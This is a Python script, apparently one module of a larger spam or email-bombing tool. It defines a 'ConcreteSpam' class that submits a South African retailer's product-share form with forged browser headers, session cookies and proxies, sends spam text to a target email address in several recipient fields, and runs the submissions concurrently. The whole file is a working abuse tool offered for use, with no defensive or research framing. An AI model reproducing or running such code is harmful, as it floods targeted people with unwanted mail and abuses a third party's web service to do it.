from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        import requests

        cookies = {
            'SSESSdfb3c16444fc5836e58b4d9dc57bfcfc': 'q9UfZuHBVDy70QUPrhpDtNoQMX1nlzin5MibH4ccjnM',
            '_ga': 'GA1.3.1446745187.1678106089',
            '_gid': 'GA1.3.651783877.1678106089',
            '_fbp': 'fb.2.1678106090491.887604618',
            '_gat': '1',
            '_gat_UA-6216226-24': '1',
            '_fw_crm_v': '091d87a7-cf33-4c36-89ca-97eb533c5fde',
        }

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            # 'Cookie': 'SSESSdfb3c16444fc5836e58b4d9dc57bfcfc=q9UfZuHBVDy70QUPrhpDtNoQMX1nlzin5MibH4ccjnM; _ga=GA1.3.1446745187.1678106089; _gid=GA1.3.651783877.1678106089; _fbp=fb.2.1678106090491.887604618; _gat=1; _gat_UA-6216226-24=1; _fw_crm_v=091d87a7-cf33-4c36-89ca-97eb533c5fde',
            'Origin': 'https://www.blockandchisel.co.za',
            'Pragma': 'no-cache',
            'Referer': 'https://www.blockandchisel.co.za/share-now/nojs/no?pid=18292',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        params = {
            'pid': '18292',
        }

        text = self.get_text(False)
        data = {
            'field_your_name[und][0][value]': text,
            'field_your_email_address[und][0][value]': target,
            'field_message[und][0][value]': text,
            'field_email_address[und][0][value]': target,
            'field_email_address[und][1][value]': target,
            'field_email_address[und][2][value]': target,
            'op': 'Submit',
            'form_build_id': 'form-kLhT6AjdlNKYvtdrlLM1bdFDcbamTjm7IwP6cEkCKVE',
            'form_id': 'share_entityform_edit_form',
            'field_productlist[und][0][value]': '{"18292":1}',
        }

        response = requests.post(
            'https://www.blockandchisel.co.za/share-now/nojs/no',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
            proxies=self.get_proxies(), timeout=20
        )
        return response


def main():
    s = 'your message has been sent'

    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
